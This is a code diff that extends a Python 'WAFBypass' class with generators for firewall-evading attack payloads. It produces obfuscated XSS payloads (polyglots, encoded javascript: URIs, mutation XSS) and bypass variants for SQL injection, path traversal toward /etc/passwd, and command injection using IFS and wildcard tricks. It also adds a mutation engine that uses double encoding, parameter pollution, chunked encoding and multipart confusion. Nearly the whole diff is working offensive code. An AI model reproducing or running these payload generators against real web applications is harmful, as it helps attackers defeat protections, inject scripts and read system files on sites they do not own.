@@ -186,6 +186,669 @@ class WAFBypass:
             'headers': bypass_headers,
         }
     
+    def xss_waf_evasion(self, base_payload: str = None) -> list:
+        """Generate specialized XSS payloads designed to bypass WAF rules.
+        
+        Implements multiple evasion techniques including event handler obfuscation,
+        SVG/MathML context payloads, protocol handler tricks, encoding chains,
+        DOM-based sinks, template literal abuse, mutation XSS patterns, and
+        polyglot payloads combining multiple contexts.
+        
+        Args:
+            base_payload: Optional base payload to build upon. If None, generates
+                          a comprehensive set of standalone evasion payloads.
+        
+        Returns:
+            List of XSS bypass payloads designed to evade WAF rules.
+        """
+        payloads = []
+        
+        alert_func = base_payload if base_payload else 'alert(1)'
+        # Strip surrounding script tags if present for embedding
+        inner = re.sub(r'</?script[^>]*>', '', alert_func, flags=re.IGNORECASE).strip()
+        if not inner:
+            inner = 'alert(1)'
+        
+        # --- Event handler obfuscation (case mixing) ---
+        event_handlers = [
+            'oNLoAd', 'ONERROR', 'oNmOuSeOvEr', 'oNfOcUs', 'oNcLiCk',
+            'ONmouseover', 'oNeRrOr', 'OnLoAd', 'oNaNiMaTiOnEnD',
+            'oNtRaNsItIoNeNd', 'oNpOiNtErOvEr',
+        ]
+        for handler in event_handlers:
+            payloads.append(f'<img src=x {handler}={inner}>')
+            payloads.append(f'<body {handler}={inner}>')
+            payloads.append(f'<input {handler}={inner} autofocus>')
+        
+        # --- SVG/MathML context payloads ---
+        payloads.extend([
+            f'<svg/onload={inner}>',
+            f"<svg onload={inner}//'>",
+            f'<svg/onload="{inner}">',
+            f'<svg><script>{inner}</script></svg>',
+            f'<svg><animate onbegin={inner} attributeName=x>',
+            f'<svg><set onbegin={inner} attributeName=x>',
+            f'<math><mtext><table><mglyph><svg><mtext><textarea><path id="x">',
+            f'<math><mtext><img src=x onerror={inner}>',
+            f'<svg><foreignObject><body onload={inner}>',
+            f'<svg><desc><template><img src=x onerror={inner}>',
+        ])
+        
+        # --- Protocol handler tricks ---
+        encoded_inner = ''.join(f'&#x{ord(c):x};' for c in inner)
+        payloads.extend([
+            f'<a href="javascript:{inner}">click</a>',
+            f'<a href="javascript:{encoded_inner}">click</a>',
+            f'<a href="data:text/html,<script>{inner}</script>">click</a>',
+            f'<a href="data:text/html;base64,{self._b64_inner("<script>" + inner + "</script>")}">click</a>',
+            f'<a href="vbscript:MsgBox(1)">click</a>',
+            f'<iframe src="javascript:{inner}">',
+            f'<object data="javascript:{inner}">',
+            f'<embed src="data:text/html,<script>{inner}</script>">',
+            f'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;{inner}">click</a>',
+            f'<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;{inner}">click</a>',
+        ])
+        
+        # --- Encoding chains (HTML entity -> URL encode -> Unicode) ---
+        html_chain = ''.join(f'&#{ord(c)};' for c in inner)
+        url_chain = ''.join(f'%{ord(c):02x}' for c in inner)
+        unicode_chain = ''.join(f'\\u{ord(c):04x}' for c in inner)
+        mixed_chain = ''
+        for i, c in enumerate(inner):
+            if i % 3 == 0:
+                mixed_chain += f'&#{ord(c)};'
+            elif i % 3 == 1:
+                mixed_chain += f'%{ord(c):02x}'
+            else:
+                mixed_chain += f'\\u{ord(c):04x}'
+        
+        payloads.extend([
+            f'<img src=x onerror="{html_chain}">',
+            f'<img src=x onerror="{url_chain}">',
+            f'<script>{unicode_chain}</script>',
+            f'<img src=x onerror="{mixed_chain}">',
+        ])
+        
+        # --- DOM-based sinks ---
+        payloads.extend([
+            f'<script>document.write("<img src=x onerror={inner}>")</script>',
+            f'<script>document.body.innerHTML="<img src=x onerror={inner}>"</script>',
+            f'<script>eval(atob("{self._b64_inner(inner)}"))</script>',
+            f'<script>eval("al"+"ert(1)")</script>',
+            f'<script>window["eval"]({inner})</script>',
+            f'<script>this["alert"](1)</script>',
+            f'<script>self["alert"](1)</script>',
+            f'<script>[].constructor.constructor("return alert(1)")()</script>',
+            f'<script>Function("alert(1)")()</script>',
+            f'<script>setTimeout("{inner}",0)</script>',
+        ])
+        
+        # --- Template literal abuse ---
+        payloads.extend([
+            '<script>`${alert(1)}`</script>',
+            '<script>tag`${alert(1)}`</script>',
+            '<script>${{alert(1)}}</script>',
+            f'<script>`${{String.fromCharCode(97,108,101,114,116)(1)}}`</script>',
+            f'<img src=x onerror=`{inner}`>',
+        ])
+        
+        # --- Mutation XSS patterns ---
+        payloads.extend([
+            f'<noscript><p title="</noscript><img src=x onerror={inner}>">',
+            f'<textarea><script>{inner}</script></textarea>',
+            f'<template><img src=x onerror={inner}></template>',
+            f'<noembed><img src=x onerror={inner}></noembed>',
+            f'<xmp><img src=x onerror={inner}></xmp>',
+            f'<title><img src=x onerror={inner}></title>',
+            f'<style><img src=x onerror={inner}></style>',
+            f'<iframe srcdoc="<img src=x onerror={inner}>">',
+            f'<noscript><img src=x onerror={inner}></noscript>',
+            f'<select><template><img src=x onerror={inner}></template></select>',
+        ])
+        
+        # --- Polyglot payloads combining multiple contexts ---
+        # Polyglot that escapes JS comments, HTML tags, and URL-encoded contexts
+        payloads.extend([
+            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk={inner} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={inner}//>',
+            f'"><img src=x onerror={inner}>//',
+            f'\'"--><svg/onload={inner}>',
+            f'</script><svg/onload={inner}>',
+            f'-"-\'><svg/onload={inner}>{{{{{{1}}}}}}<img src=x onerror={inner}>',
+            f'{{{{constructor.constructor("return this")().alert(1)}}}}',
+            f'<div onpointerover="{inner}">MOVE HERE</div>',
+            f'%3Csvg%20onload%3D{inner}%3E',
+            f'<details open ontoggle={inner}>',
+            f'<marquee onstart={inner}>',
+        ])
+        
+        return payloads
+    
+    def _b64_inner(self, inner: str) -> str:
+        """Base64 encode a string for use in evasion payloads.
+        
+        Uses a pure-Python base64 implementation to avoid additional imports.
+        
+        Args:
+            inner: String to encode.
+        
+        Returns:
+            Base64-encoded string.
+        """
+        b64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+        data = inner.encode('utf-8')
+        result = []
+        for i in range(0, len(data), 3):
+            chunk = data[i:i + 3]
+            n = int.from_bytes(chunk, 'big') << (8 * (3 - len(chunk)))
+            num_output = len(chunk) + 1
+            for j in range(num_output):
+                result.append(b64_chars[(n >> (18 - 6 * j)) & 0x3F])
+            result.extend(['='] * (4 - num_output))
+        return ''.join(result)
+    
+    def regex_bypass_generate(self, payload: str, context: str = 'xss') -> list:
+        """Analyze common WAF regex patterns and generate bypass variants.
+        
+        Applies context-aware transformations to evade regex-based WAF rules
+        using character substitution, null byte insertion, comment injection,
+        alternate encoding, concatenation splitting, case alternation,
+        whitespace alternatives, and context-specific bypasses.
+        
+        Args:
+            payload: The original payload to generate bypass variants for.
+            context: The attack context type. One of 'sql', 'xss',
+                     'path_traversal', or 'cmdi'. Defaults to 'xss'.
+        
+        Returns:
+            List of regex-bypass payload variants.
+        """
+        variants = []
+        
+        # --- Character substitution (Unicode homoglyphs) ---
+        homoglyphs = {
+            'a': '\u0430', 'e': '\u0435', 'o': '\u043e', 'p': '\u0440',
+            'c': '\u0441', 'x': '\u0445', 's': '\u0455', 'i': '\u0456',
+            'A': '\u0410', 'E': '\u0415', 'O': '\u041e', 'S': '\u0405',
+            'T': '\u0422', 'H': '\u041d', 'B': '\u0412', 'M': '\u041c',
+        }
+        homoglyph_payload = ''
+        for c in payload:
+            if c in homoglyphs and random.random() < 0.5:
+                homoglyph_payload += homoglyphs[c]
+            else:
+                homoglyph_payload += c
+        variants.append(homoglyph_payload)
+        
+        # Full homoglyph substitution variant
+        full_homoglyph = ''.join(homoglyphs.get(c, c) for c in payload)
+        variants.append(full_homoglyph)
+        
+        # --- Null byte insertion (%00) between keywords ---
+        keywords = ['select', 'union', 'script', 'alert', 'onerror',
+                     'onload', 'eval', 'exec', 'passwd', 'shadow']
+        null_payload = payload
+        for kw in keywords:
+            if kw in null_payload.lower():
+                idx = null_payload.lower().find(kw)
+                mid = len(kw) // 2
+                original_kw = null_payload[idx:idx + len(kw)]
+                null_payload = (null_payload[:idx + mid] + '%00' +
+                                null_payload[idx + mid:])
+        variants.append(null_payload)
+        
+        # --- Comment insertion (/**/, --, #) within SQL/HTML ---
+        comment_styles = ['/**/', '/*!*/', '/*! */', '-- -\n', '#\n']
+        for comment in comment_styles:
+            commented = ''
+            i = 0
+            while i < len(payload):
+                commented += payload[i]
+                if payload[i].isalpha() and i + 1 < len(payload) and payload[i + 1].isalpha():
+                    if random.random() < 0.3:
+                        commented += comment
+                i += 1
+            variants.append(commented)
+        
+        # --- Alternate encoding representation ---
+        # Octal encoding
+        variants.append(''.join(f'\\{ord(c):03o}' for c in payload))
+        # Hex encoding
+        variants.append(''.join(f'\\x{ord(c):02x}' for c in payload))
+        # HTML decimal entities
+        variants.append(''.join(f'&#{ord(c)};' for c in payload))
+        # HTML hex entities
+        variants.append(''.join(f'&#x{ord(c):x};' for c in payload))
+        
+        # --- Concatenation splitting ---
+        split_keywords = {
+            'select': "'sel'+'ect'", 'union': "'un'+'ion'",
+            'alert': "'al'+'ert'", 'script': "'scr'+'ipt'",
+            'eval': "'ev'+'al'", 'document': "'doc'+'ument'",
+            'cookie': "'coo'+'kie'", 'window': "'win'+'dow'",
+            'onload': "'on'+'load'", 'onerror': "'on'+'error'",
+        }
+        concat_payload = payload
+        for kw, replacement in split_keywords.items():
+            pattern = re.compile(re.escape(kw), re.IGNORECASE)
+            concat_payload = pattern.sub(replacement, concat_payload)
+        variants.append(concat_payload)
+        
+        # JS concat variant
+        js_concat_payload = payload
+        for kw in split_keywords:
+            if kw in js_concat_payload.lower():
+                idx = js_concat_payload.lower().find(kw)
+                original = js_concat_payload[idx:idx + len(kw)]
+                mid = len(original) // 2
+                js_replacement = f'{original[:mid]}"+"{original[mid:]}'
+                js_concat_payload = (js_concat_payload[:idx] + js_replacement +
+                                     js_concat_payload[idx + len(kw):])
+        variants.append(js_concat_payload)
+        
+        # --- Case alternation pattern ---
+        # sElEcT style
+        variants.append(''.join(
+            c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
+        ))
+        # Inverse: sElEcT -> SeLeCt
+        variants.append(''.join(
+            c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload)
+        ))
+        # Random case variant
+        variants.append(''.join(
+            c.upper() if random.random() < 0.5 else c.lower() for c in payload
+        ))
+        
+        # --- Whitespace alternatives ---
+        ws_alternatives = ['%09', '%0a', '%0b', '%0c', '%0d', '%a0',
+                           '+', '%20', '%09%0a', '/**/']
+        for ws in ws_alternatives:
+            variants.append(payload.replace(' ', ws))
+        
+        # --- Context-specific bypasses ---
+        if context == 'sql':
+            variants.extend(self._sql_context_bypasses(payload))
+        elif context == 'xss':
+            variants.extend(self._xss_context_bypasses(payload))
+        elif context == 'path_traversal':
+            variants.extend(self._path_traversal_context_bypasses(payload))
+        elif context == 'cmdi':
+            variants.extend(self._cmdi_context_bypasses(payload))
+        
+        return variants
+    
+    def _sql_context_bypasses(self, payload: str) -> list:
+        """Generate SQL-specific regex bypass variants.
+        
+        Args:
+            payload: The original SQL payload.
+        
+        Returns:
+            List of SQL context bypass variants.
+        """
+        variants = []
+        # Version-specific MySQL comments
+        variants.append(re.sub(
+            r'(SELECT|UNION|INSERT|UPDATE|DELETE)',
+            lambda m: f'/*!50000{m.group(0)}*/',
+            payload, flags=re.IGNORECASE
+        ))
+        # Inline comments between every keyword character
+        variants.append(re.sub(
+            r'(SELECT|UNION)',
+            lambda m: '/**/'.join(m.group(0)),
+            payload, flags=re.IGNORECASE
+        ))
+        # Scientific notation for numeric contexts
+        variants.append(payload.replace(' 1', ' 1e0').replace(' 0', ' 0e0'))
+        # LIKE-based equivalences
+        variants.append(payload.replace('=', ' LIKE '))
+        variants.append(payload.replace('=', ' REGEXP '))
+        # Parenthesis wrapping
+        variants.append(re.sub(
+            r'(SELECT|UNION ALL SELECT)',
+            lambda m: f'({m.group(0)})',
+            payload, flags=re.IGNORECASE
+        ))
+        return variants
+    
+    def _xss_context_bypasses(self, payload: str) -> list:
+        """Generate XSS-specific regex bypass variants.
+        
+        Args:
+            payload: The original XSS payload.
+        
+        Returns:
+            List of XSS context bypass variants.
+        """
+        variants = []
+        # Tag name variations
+        variants.append(payload.replace('<script', '<SCRIPT').replace('</script', '</SCRIPT'))
+        variants.append(payload.replace('<script', '<ScRiPt').replace('</script', '</ScRiPt'))
+        # Slash variations
+        variants.append(payload.replace('<script>', '<script/>'))
+        variants.append(payload.replace('<script>', '<script >'))
+        # Event handler padding
+        variants.append(re.sub(
+            r'(on\w+)=',
+            lambda m: f'{m.group(1)}  =',
+            payload, flags=re.IGNORECASE
+        ))
+        # Newline in tag
+        variants.append(payload.replace('<', '<\n').replace('>', '\n>'))
+        # Tab in attributes
+        variants.append(payload.replace('=', '\t=\t'))
+        # JS URI scheme variations
+        variants.append(payload.replace('javascript:', 'javascript\t:'))
+        variants.append(payload.replace('javascript:', 'java\x00script:'))
+        return variants
+    
+    def _path_traversal_context_bypasses(self, payload: str) -> list:
+        """Generate path traversal specific regex bypass variants.
+        
+        Args:
+            payload: The original path traversal payload.
+        
+        Returns:
+            List of path traversal context bypass variants.
+        """
+        variants = []
+        variants.append(payload.replace('../', '..\\'))
+        variants.append(payload.replace('../', '....//'))
+        variants.append(payload.replace('../', '..%252f'))
+        variants.append(payload.replace('../', '%2e%2e/'))
+        variants.append(payload.replace('../', '%2e%2e%2f'))
+        variants.append(payload.replace('../', '..%c0%af'))
+        variants.append(payload.replace('../', '..%ef%bc%8f'))
+        variants.append(payload.replace('etc/passwd', 'etc%00/passwd'))
+        return variants
+    
+    def _cmdi_context_bypasses(self, payload: str) -> list:
+        """Generate command injection specific regex bypass variants.
+        
+        Args:
+            payload: The original command injection payload.
+        
+        Returns:
+            List of command injection context bypass variants.
+        """
+        variants = []
+        # Quoting tricks
+        variants.append(payload.replace('cat', "c'a't"))
+        variants.append(payload.replace('cat', 'c"a"t'))
+        variants.append(payload.replace('cat', 'c\\at'))
+        # Variable expansion
+        variants.append(payload.replace('cat', '${IFS}cat'))
+        variants.append(payload.replace(' ', '${IFS}'))
+        variants.append(payload.replace(' ', '$IFS$9'))
+        variants.append(payload.replace(' ', '{,}'))
+        # Wildcard tricks
+        variants.append(payload.replace('/etc/passwd', '/e?c/p?sswd'))
+        variants.append(payload.replace('/etc/passwd', '/e*/passwd'))
+        # Operator alternatives
+        variants.append(payload.replace(';', '%0a'))
+        variants.append(payload.replace(';', '|'))
+        variants.append(payload.replace(';', '||'))
+        variants.append(payload.replace(';', '&&'))
+        return variants
+    
+    def custom_mutation_engine(self, payload: str, rounds: int = 3) -> list:
+        """Apply multiple rounds of mutations to payloads while preserving
+        semantic intent.
+        
+        Mutation operators include bit flipping, junk character insertion,
+        boundary condition exploits, content-type confusion, HTTP parameter
+        pollution variants, double encoding chains, and chunked transfer
+        encoding variations.
+        
+        Args:
+            payload: The original payload to mutate.
+            rounds: Number of mutation rounds to apply. Defaults to 3.
+        
+        Returns:
+            List of mutated payload variants.
+        """
+        mutation_operators = [
+            self._mutate_bit_flip,
+            self._mutate_junk_insert,
+            self._mutate_boundary_exploit,
+            self._mutate_content_type_confusion,
+            self._mutate_hpp,
+            self._mutate_double_encode,
+            self._mutate_chunked_variation,
+        ]
+        
+        variants = []
+        current_payloads = [payload]
+        
+        for _round in range(rounds):
+            next_payloads = []
+            for current in current_payloads:
+                operator = random.choice(mutation_operators)
+                mutated = operator(current)
+                if mutated and mutated != current:
+                    next_payloads.append(mutated)
+                    variants.append(mutated)
+            if next_payloads:
+                current_payloads = next_payloads
+            else:
+                break
+        
+        # Also generate one variant per operator directly from original
+        for operator in mutation_operators:
+            mutated = operator(payload)
+            if mutated:
+                variants.append(mutated)
+        
+        return variants
+    
+    def _mutate_bit_flip(self, payload: str) -> str:
+        """Apply bit flipping on specific characters.
+        
+        Flips a single bit in a randomly chosen character of the payload,
+        targeting non-structural characters to preserve semantic meaning.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Payload with one character bit-flipped.
+        """
+        if not payload:
+            return payload
+        chars = list(payload)
+        # Find candidate positions (alphanumeric only to preserve structure)
+        candidates = [i for i, c in enumerate(chars) if c.isalnum()]
+        if not candidates:
+            return payload
+        idx = random.choice(candidates)
+        original_ord = ord(chars[idx])
+        # Flip a random bit in the lower 5 bits to stay in printable range
+        bit = 1 << random.randint(0, 4)
+        flipped = original_ord ^ bit
+        if 32 <= flipped <= 126:
+            chars[idx] = chr(flipped)
+        return ''.join(chars)
+    
+    def _mutate_junk_insert(self, payload: str) -> str:
+        """Insert junk characters that parsers typically strip.
+        
+        Inserts characters like null bytes, backspaces, zero-width spaces,
+        and soft hyphens at random positions within the payload.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Payload with junk characters inserted.
+        """
+        junk_chars = [
+            '%00', '%08', '%0d',       # null byte, backspace, carriage return
+            '\u200b', '\u200c',         # zero-width space, zero-width non-joiner
+            '\u200d', '\ufeff',         # zero-width joiner, BOM
+            '\u00ad',                   # soft hyphen
+        ]
+        result = list(payload)
+        # Insert 1-3 junk chars at random positions
+        num_inserts = random.randint(1, 3)
+        for _ in range(num_inserts):
+            pos = random.randint(0, len(result))
+            junk = random.choice(junk_chars)
+            result.insert(pos, junk)
+        return ''.join(result)
+    
+    def _mutate_boundary_exploit(self, payload: str) -> str:
+        """Exploit boundary conditions with max-length padding and null
+        terminators.
+        
+        Adds padding to push payload content to boundary edges where WAF
+        parsers may truncate or fail.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Payload with boundary condition exploitation applied.
+        """
+        strategies = [
+            # Null terminator prefix
+            lambda p: '%00' + p,
+            # Null terminator suffix
+            lambda p: p + '%00',
+            # Padding with junk before payload (WAF buffer overflow attempt)
+            lambda p: 'A' * random.randint(128, 512) + p,
+            # Padding after payload
+            lambda p: p + 'A' * random.randint(128, 512),
+            # Mixed padding with null terminators
+            lambda p: 'X' * random.randint(64, 256) + '%00' + p + '%00',
+            # Newline padding
+            lambda p: '\r\n' * random.randint(8, 32) + p,
+        ]
+        strategy = random.choice(strategies)
+        return strategy(payload)
+    
+    def _mutate_content_type_confusion(self, payload: str) -> str:
+        """Generate content-type confusion through multipart boundary
+        manipulation.
+        
+        Wraps the payload in multipart form data structures that may confuse
+        WAF content-type parsing.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Payload wrapped in content-type confusion structure.
+        """
+        boundary = ''.join(random.choices(
+            'abcdefghijklmnopqrstuvwxyz0123456789', k=16
+        ))
+        templates = [
+            # Standard multipart wrapping
+            (f'--{boundary}\r\n'
+             f'Content-Disposition: form-data; name="input"\r\n\r\n'
+             f'{payload}\r\n--{boundary}--'),
+            # Filename trick
+            (f'--{boundary}\r\n'
+             f'Content-Disposition: form-data; name="file"; filename="{payload}"\r\n'
+             f'Content-Type: application/octet-stream\r\n\r\n'
+             f'{payload}\r\n--{boundary}--'),
+            # Double Content-Disposition
+            (f'--{boundary}\r\n'
+             f'Content-Disposition: form-data; name="safe"\r\n'
+             f'Content-Disposition: form-data; name="input"\r\n\r\n'
+             f'{payload}\r\n--{boundary}--'),
+        ]
+        return random.choice(templates)
+    
+    def _mutate_hpp(self, payload: str) -> str:
+        """Generate HTTP parameter pollution variants.
+        
+        Splits the payload across multiple parameter instances to exploit
+        differences in how WAFs and backends handle duplicate parameters.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            HPP variant of the payload.
+        """
+        if len(payload) < 4:
+            return payload
+        
+        strategies = [
+            # Split into two parameters
+            lambda p: f'input={p[:len(p)//2]}&input={p[len(p)//2:]}',
+            # Duplicate with junk first
+            lambda p: f'input=harmless&input={p}',
+            # Array notation
+            lambda p: f'input[]={p[:len(p)//2]}&input[]={p[len(p)//2:]}',
+            # Mixed case parameter names
+            lambda p: f'input={p}&INPUT={p}&Input={p}',
+            # Semicolon delimiter (some servers accept it)
+            lambda p: f'input={p[:len(p)//2]};input={p[len(p)//2:]}',
+        ]
+        strategy = random.choice(strategies)
+        return strategy(payload)
+    
+    def _mutate_double_encode(self, payload: str) -> str:
+        """Apply double encoding chains to the payload.
+        
+        Double-encodes characters to bypass WAFs that only decode one layer
+        of encoding.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Double-encoded payload variant.
+        """
+        strategies = [
+            # Full double URL encode
+            lambda p: ''.join(f'%25{ord(c):02x}' for c in p),
+            # Selective double encode (only special chars)
+            lambda p: ''.join(
+                f'%25{ord(c):02x}' if not c.isalnum() else c for c in p
+            ),
+            # Triple encode
+            lambda p: ''.join(f'%2525{ord(c):02x}' for c in p),
+            # Mixed single and double encode
+            lambda p: ''.join(
+                f'%25{ord(c):02x}' if random.random() < 0.5
+                else f'%{ord(c):02x}' for c in p
+            ),
+        ]
+        strategy = random.choice(strategies)
+        return strategy(payload)
+    
+    def _mutate_chunked_variation(self, payload: str) -> str:
+        """Generate chunked transfer encoding variations.
+        
+        Splits the payload into chunks of varying sizes with optional
+        chunk extensions that may confuse WAF stream processing.
+        
+        Args:
+            payload: The payload to mutate.
+        
+        Returns:
+            Chunked encoding variant of the payload.
+        """
+        result = []
+        i = 0
+        while i < len(payload):
+            # Random chunk size between 1 and 5
+            chunk_size = random.randint(1, min(5, len(payload) - i))
+            chunk = payload[i:i + chunk_size]
+            # Optionally add chunk extensions
+            extension = ''
+            if random.random() < 0.3:
+                ext_name = ''.join(random.choices('abcdefghij', k=4))
+                extension = f';{ext_name}={"".join(random.choices("0123456789", k=2))}'
+            result.append(f'{chunk_size:x}{extension}\r\n{chunk}\r\n')
+            i += chunk_size
+        result.append('0\r\n\r\n')
+        return ''.join(result)
+    
     def advanced_bypass(self, payload: str, waf_type: str = None) -> list:
         """Advanced WAF bypass with evasion engine integration"""
         variants = self.bypass_techniques(payload, waf_type)
@@ -208,6 +871,23 @@ class WAFBypass:
                 variants.append(mutator.mutate(payload, 'js_obfuscate'))
         except Exception:
             pass
+        
+        # XSS WAF evasion payloads
+        if '<' in payload or 'script' in payload.lower() or 'alert' in payload.lower():
+            variants.extend(self.xss_waf_evasion(payload))
+        
+        # Regex bypass variants for detected contexts
+        if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE']):
+            variants.extend(self.regex_bypass_generate(payload, context='sql'))
+        if '<' in payload or 'script' in payload.lower():
+            variants.extend(self.regex_bypass_generate(payload, context='xss'))
+        if '../' in payload or '..\\' in payload:
+            variants.extend(self.regex_bypass_generate(payload, context='path_traversal'))
+        if any(c in payload for c in [';', '|', '&&', '`']):
+            variants.extend(self.regex_bypass_generate(payload, context='cmdi'))
+        
+        # Custom mutation engine variants
+        variants.extend(self.custom_mutation_engine(payload))
         
         return list(set(variants))
     
